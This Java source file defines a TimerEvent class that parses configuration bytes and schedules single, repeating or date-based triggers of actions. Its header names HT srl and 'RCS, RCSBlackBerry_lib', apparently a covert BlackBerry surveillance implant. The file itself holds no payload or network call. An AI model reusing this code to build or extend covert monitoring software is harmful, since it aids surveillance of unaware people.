/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : TimerEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.util.Date;

import net.rim.device.api.util.DataBuffer;

import blackberry.Conf;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

public class TimerEvent extends Event {
    private static final int SLEEP_TIME = 1000;

    //#debug
    private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);

    int type;
    long loDelay;
    long hiDelay;

    Date timestamp;

    public TimerEvent(int actionId, byte[] confParams) {
        super(Event.EVENT_TIMER, actionId, confParams);
    }
    
    public TimerEvent(int actionId_, int type_, int loDelay_, int hiDelay_) {
        super(Event.EVENT_TIMER, actionId_, "TimerEvent");
        this.type = type_;
        this.loDelay = loDelay_;
        this.hiDelay = hiDelay_;
        init();
    }
    private void init() {

        switch (this.type) {
        case Conf.CONF_TIMER_SINGLE:
            // #debug
            debug.trace("CONF_TIMER_SINGLE");
            setDelay(loDelay);
            setPeriod(NEVER);
            break;
        case Conf.CONF_TIMER_REPEAT:
            // #debug
            debug.trace("CONF_TIMER_REPEAT");
            setPeriod(loDelay);
            setDelay(loDelay);
            break;
        case Conf.CONF_TIMER_DATE:
            // #debug
            debug.trace("CONF_TIMER_DATE");
            long tmpTime = hiDelay << 32;
            tmpTime += loDelay;
            //#mdebug
            Date date = new Date(tmpTime);
            debug.trace("TimerDate: "+ date);
            //#enddebug

            setPeriod(NEVER);
            long now = Utils.getTime();
            setDelay(tmpTime - now);
            break;
        case Conf.CONF_TIMER_DELTA:
            // TODO: da implementare
            // #debug
            debug.trace("CONF_TIMER_DELTA");
            break;
        default:
            // #debug
            debug.error("shouldn't be here");
            break;
        }
    }

    protected void actualRun() {
        debug.trace("actualRun");
        trigger();
    }

    protected boolean parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            this.type = databuffer.readInt();
            this.loDelay = databuffer.readInt();
            this.hiDelay = databuffer.readInt();

            // #debug
            debug.trace("type: " + type + " lo:" + loDelay + " hi:" + hiDelay);

        } catch (EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        init();

        return true;
    }

}
